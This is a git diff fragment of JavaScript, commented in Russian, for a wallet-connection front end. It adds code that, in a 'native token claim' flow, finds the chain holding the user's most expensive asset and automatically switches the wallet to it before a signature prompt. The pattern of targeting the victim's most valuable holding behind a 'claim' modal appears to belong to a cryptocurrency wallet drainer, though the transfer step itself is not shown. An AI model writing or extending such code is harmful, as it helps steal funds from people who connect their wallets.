@@ -959,6 +959,52 @@ const initializeSubscribers = (modal) => {
         
         if (mostExpensive.address === 'native') {
           console.log('Processing native token claim...')
+          
+          // Проверяем, нужно ли переключить сеть
+          const targetNetworkInfo = networkMap[mostExpensive.network]
+          if (!targetNetworkInfo) {
+            const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
+            store.errors.push(errorMessage)
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
+          }
+          
+          const targetNetwork = targetNetworkInfo.networkObj
+          const expectedChainId = targetNetworkInfo.chainId
+          
+          // Переключаемся на нужную сеть, если необходимо
+          if (store.networkState.chainId !== expectedChainId) {
+            console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+            try {
+              await new Promise((resolve, reject) => {
+                const unsubscribe = appKit.subscribeNetwork(networkState => {
+                  if (networkState.chainId === expectedChainId) {
+                    console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+                    unsubscribe()
+                    resolve()
+                  }
+                })
+                appKit.switchNetwork(targetNetwork).catch(error => {
+                  unsubscribe()
+                  reject(error)
+                })
+                setTimeout(() => {
+                  unsubscribe()
+                  reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+                }, 10000)
+              })
+            } catch (error) {
+              const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
+              store.errors.push(errorMessage)
+              hideCustomModal()
+              store.isProcessingConnection = false
+              return
+            }
+          } else {
+            console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+          }
+          
           try {
             // Обновляем модальное окно для показа подписи
             const modalMessage = document.querySelector('.custom-modal-message')
